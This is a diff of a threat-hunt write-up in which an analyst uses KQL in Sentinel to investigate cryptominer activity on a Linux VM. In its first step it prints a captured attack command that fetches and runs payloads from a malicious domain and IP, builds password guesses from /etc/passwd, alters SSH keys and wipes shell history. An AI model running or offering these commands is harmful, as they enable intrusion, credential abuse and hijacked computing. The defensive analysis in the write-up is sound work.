@@ -49,58 +49,70 @@ I will perform the threat hunt across all internet-facing cloud assets within th
 
 ## 🧩 Steps Taken During Hunt
 
-### 1. Searched the `SecurityEvents` Table for Greater than 10 failed Logon Attempts
+### 1. Searched the `DeviceProcessEvents` Table for Cryptomining Software Installation over the last 7 Days:
 
-I began my query by using the `SecurityEvent` to look for any failed logon attempts (greater than 10) in the last 7 days by searching for Event ID 4625 (Account failed to log on). In addition, I included for the results to list the account names, IP addresses/ports, failure reason, how many times the event occured and logon types for any returned results:
+I began my query by using the `DeviceProcessEvents` to look for common cryptomining software names that have been used in command line processes:
 
 **Query used to locate events:**
 ```kql
-SecurityEvent
-| where EventID == 4625
-| where TimeGenerated > ago(7d)
-| summarize FailedAttempts = count(), 
-            StartTime = min(TimeGenerated), 
-            EndTime = max(TimeGenerated)
-    by AccountName, IpAddress, Computer
-| where FailedAttempts > 10
-| project StartTime, EndTime, AccountName, IpAddress, Computer, FailedAttempts
-| order by FailedAttempts desc
+DeviceProcessEvents
+| where ProcessCommandLine has_any ("xmrig", "ethminer", "minerd", "cpuminer") 
 ```
 
-The results yielded 309 failed logon events on the `windows-target-1` endpoint in the past 7 days, with many of them having thousands of failed logon attempts:
+The results yielded 16 entries that showed Bash commands containing our cryptominer keywords being ran on a Linux machine named `linux-programmatic-fix-jay` on May 28, 2025 beginning on 1:50:09.713 AM UTC:
 
-![image](https://github.com/user-attachments/assets/e9cf38fa-ab07-4539-9ade-fd3f1eba0472)
+![image](https://github.com/user-attachments/assets/308d4e1d-5c71-47c5-a165-4168772c8652)
 
-Additionally I ran the top 3 IP addresses with the highest logon attempts through VirusTotal, and they all came back flagged as malicious. It is also important to note that these IP addresses are registered in foreign countries such as Russia, United Arab Emirates, and Peru (company is based in USA):
+![image](https://github.com/user-attachments/assets/1d7e7272-1e89-4950-9c75-549a68062a9f)
 
-![image](https://github.com/user-attachments/assets/4b7f78f2-a6ea-4792-9fb1-ab9b890db661)
+The discovered Bash command is as follows:
 
-![image](https://github.com/user-attachments/assets/5788ec5f-00de-4833-ab8a-d57d4cfd5ac4)
+```
+./retea -c "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]thenecho -e ""elseecho Logged with successfully.rm -rf .retea crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents  /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune[.]com/payload || curl -O -s -L dinpasiune.com/payload || wget85.31.47.99/payload || curl -O -s -L85.31.47.99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_historychmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_historyfirm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999cd /dev/shmmkdir /dev/shm/.x > /dev/null 2>&1mv network .x/cd .xrm -rf retea ips iptemp ips iplistsleep 1rm -rf passuseri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1`echo $useri > .usrspasus=.usrscheck=`grep -c . .usrs`for us in $(cat $pasus) ; doprintf "$us $us\n" >> passprintf "$us $us"$us"\n" >> passprintf "$us "$us"123\n" >> passprintf "$us "$us"123456\n" >> passprintf "$us 123456\n">> passprintf "$us 1\n">> passprintf "$us 12\n">> passprintf "$us 123\n">> passprintf "$us 1234\n">> passprintf "$us 12345\n">> passprintf "$us 12345678\n">> passprintf "$us 123456789\n">> passprintf "$us 123.com\n">> passprintf "$us 123456.com\n">> passprintf "$us 123\n" >> passprintf "$us 1qaz@WSX\n" >> passprintf "$us "$us"@123\n" >> passprintf "$us "$us"@1234\n" >> passprintf "$us "$us"@123456\n" >> passprintf "$us "$us"123\n" >> passprintf "$us "$us"1234\n" >> passprintf "$us "$us"123456\n" >> passprintf "$us qwer1234\n" >> passprintf "$us 111111\n">> passprintf "$us Passw0rd\n" >> passprintf "$us P@ssw0rd\n" >> passprintf "$us qaz123!@#\n" >> passprintf "$us !@#\n" >> passprintf "$us password\n" >> passprintf "$us Huawei@123\n" >> passdonewaitsleep 0.5cat bios.txt | sort -R | uniq | uniq > icat i > bios.txt./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm [-rf] .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"sleep 25function Miner {rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ;  rm -rf ~/.bash_historyhistory -c}Miner' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
+```
 
-![image](https://github.com/user-attachments/assets/52c1c6c2-24e7-45ae-99a4-cc9fa9523220)
+Upon analyzing this command, it seems like the script was trying to do the following:
+
+- Install a malware called `retea`
+- Delete any other cryptomining software that may already be present (i.e. haiduc, blacku, xMEu, xmrig, cnrig, etc.)
+- Remove previous cron jobs and temp folder to clear any trace of malware
+- Deletes activity history with `/.bash_history`, `.bash_history`, and `history -c`.
+- Tries to modify `ulimit` and `/etc/sysctl.conf` to increase processing power.
+- Download a malicious payload from a domain called `dinpasiune[.]com` from IP `85[.]31.47.99`
+- Reads the `/etc/passwd` in order to access other user credentials and create a list of password/user permutations.
+- Recreates the `/var/tmp/Documents` directory and stores `diicot` and `kuak` files into them (malware)
+- Modifies `authorized_keys`, removes file immutability (`chattr -iae`).
+- Executes secondary payloads again (`.balu`, `cache`, etc.)
+- Deletes all miner-payload related folders and history to prevent detection.
+
+A quick VirustTotal check of the IP and Domain name found shows that they are both flagged as malicious (malware + cryptomining). A rever DNS lookup of the IP also shows that the domain was registered in New Zealand in 2023:
+
+![image](https://github.com/user-attachments/assets/df2581c4-f6b5-46d1-8e61-389f72305a75)
+
+![image](https://github.com/user-attachments/assets/3137fbaf-7998-4bab-984a-9271c5ca058e)
+
+![image](https://github.com/user-attachments/assets/f409aa66-405c-4b0e-83ec-2e37334ef693)
+
 
 
 ---
 
-### 2. Searched the `SecurityEvents` Table for Successful Login Attempts from Malicious IPs
+### 2. Searched the `Syslog` Table for Successful Login Attempts from Malicious IP.
 
-Due to the sheer number of failed logon attempts in just a 7 day period, it is safe to assume that some kind of brute force attack has been in play. Next, we are going to determine whether any of the malicious IP addresses actually successfully logged into the `windows-target-1` during their brute force attacks. To do this, I first want to get a list of all suspicious IP's that meet this criteria using the following KQL query in Sentinel:
+Now that we have discovered that the linux `linux-programmatic-fix-jay`, it has been likely infected with cryptomining software on `May 28, 2025`. Once isolated, I can continue my investigation by reviewing the `DeviceNetowrkEvents` log for this machine in order to ascertain how it was breached.
+
+I will use the following KQL to examine the network traffic that occured between May 27-29, 2025:
 
 ```kql
-SecurityEvent
-| where EventID == 4625
-| where TimeGenerated > ago(7d)
-| where Computer == "windows-target-1"
-| summarize FailedAttempts = count()
-    by IpAddress
-| where FailedAttempts > 10
-| order by FailedAttempts desc
+Syslog
+| where HostIP contains "linux-programmatic-fix-jay"
+| where TimeGenerated between(datetime(2025-05-27T00:00:00Z)..datetime(2025-05-29T00:00:00Z))
+| where SyslogMessage has_any ("Failed password", "Invalid user", "authentication failure")
 ```
-The results show there were 311 unique IP addresses that accumulated more than 10 failed logon attempts in the last 7 days:
+However, none of the above queries returned any result. And after further investigation, it turns out that this VM was not onboarded into our Microsoft Defender for Endpoint, nor was syslog properly configured to show complete networking logs. Therefore, it is difficult to ascertain if there were any brute force attempts from a external or internal IP.
 
-![image](https://github.com/user-attachments/assets/91834a79-5dc7-480d-bda7-f3f701b3f364)
+![image](https://github.com/user-attachments/assets/e00ded82-e1e8-4684-b484-88dc3f0c083c)
 
-Now that I have identified these IP addresses, I decided to search the Sentinel logs to see if any one of these IPs successfully logged into our endpoint using the following KQL query:
 
 **Query used to locate event:**
 
@@ -120,30 +132,26 @@ The results show that there have been 1000 successful login attempts. Out of the
 
 ---
 
-### 3. Incident Response and Remediation
+### 3. Searched Device File Events to Identify any Malicious File Artifacts that were created
 
-We have verified that there have been multiple brute force attacks from multiple malicious IPs and geographical locations. There were no successful logons from these attacks, therefore, our next goal is to develop remediation steps and forward these recommendations to the appropriate management/stakeholders so that they can be approved for implementation.
+Next, I looked up any file events that were recorded in Sentinel to see if I could identify any malicious file artififacts. I utilized the following KQL query to do so
 
-There are three main remediation steps that can implement right away:
+```kql
+DeviceFileEvents
+| where DeviceName contains "linux-programmatic-fix-jay"
+| where TimeGenerated between(datetime(2025-05-28T00:00:00Z)..datetime(2025-05-29T00:00:00Z))
+```
+This query produced over 1000 entries of hundreds of files being deleted and created in the span of about 15 minutes between the hours of 1:45am -2:00am UTC on May 28, 2025:
 
-1. Block all verified malicious IP addresses that were logged in Sentinel.
+![image](https://github.com/user-attachments/assets/f108ac6a-e7ca-4882-8f8f-943329b549cc)
 
-2. Disable any unnecessary remote services that can increase the attack surface. These services can include:
-- SSH (22/TCP)
-- Telnet (23/TCP)
-- FTP (21/TCP)
-- NetBIOS / SMB / Samba (139/TCP & 445/TCP)
-- LDAP (389/TCP)
-- Kerberos (88/TCP)
-- RDP / Terminal Services (3389/TCP)
-- HTTP/HTTP Management Services (80/TCP & 443/TCP)
-- MSSQL (1433/TCP)
-- Oracle (1521/TCP)
-- MySQL (3306/TCP)
-- VNC (5900/TCP)
-- SNMP (161/UDP and 162/TCP/UDP)
+![image](https://github.com/user-attachments/assets/8676b788-3d0c-4397-b7ab-d2f70e3354cd)
 
-3. Enable an account lockout policy for this device after 5 failed logon attempts within the Microsoft Defender for Endpoint (EDR)
+
+
+
+
+
 
 ---
 
